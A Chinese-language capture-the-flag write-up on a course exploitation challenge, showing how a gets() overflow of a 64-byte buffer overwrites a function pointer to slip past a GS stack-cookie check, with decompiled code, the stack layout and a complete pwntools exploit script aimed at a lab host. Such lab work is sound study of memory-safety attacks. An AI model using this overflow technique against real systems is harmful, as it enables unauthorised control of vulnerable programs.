# 系统层漏洞利用与逆向分析-GS缓冲区安全检查利用-G3 WriteUp

G3通过在返回前覆盖将要执行的函数指针，即可跳过ret前的安全检查，实现对程序的控制。

观察漏洞代码反编译结果：

```c
undefined4 FUN_00401040(void)

{
  undefined *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  undefined1 buff [64];
  code *p_function;
  uint stack_cookie;
  
  stack_cookie = DAT_0041d040 ^ (uint)&stack0xfffffffc;
  p_function = FUN_00401020;
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(0);
  FUN_00404733((int)puVar1,uVar2,iVar3,iVar4);
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(1);
  FUN_00404733((int)puVar1,uVar2,iVar3,iVar4);
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(2);
  FUN_00404733((int)puVar1,uVar2,iVar3,iVar4);
  printf(0x41d00c);
  printf(0x41d01c);
  printf(0x41d02c);
  gets(buff);
  (*p_function)();
  return 0;
}
```

代码在缓冲区溢出之后，若覆盖了函数指针p_function的值，会导致程序执行了攻击者指定的函数。

查看栈布局：

```
                             *************************************************************
                             *                           FUNCTION                         
                             *************************************************************
                               undefined4  __stdcall  FUN_00401040 (void )
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined4        Stack[-0x8]:4  stack_cookie                            XREF[2]:     0040104d (W) , 
                                                                                                   004010e2 (R)   
             undefined4        Stack[-0xc]:4  p_function                              XREF[2]:     00401050 (W) , 
                                                                                                   004010b3 (*)   
             undefined1[64]    Stack[-0x4c]   buff                                    XREF[2]:     004010a2 (*) , 
                                                                                                   004010d1 (*)   
                             FUN_00401040                                    XREF[1]:     FUN_0040123d:00401335 (c)   
        00401040 55              PUSH       EBP
```

要覆盖函数指针p_function的值，需要在输入中填充64字节的buff，然后再填充4字节的p_function地址。

## 代码

```python
from pwn import *

r = remote('172.17.29.251', 9999)

GET_FLAG = 0x00401000

banner = r.recvuntil(b': ')
print(banner.decode(errors='replace'))

payload = b'A' * 64 + p32(GET_FLAG)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")
```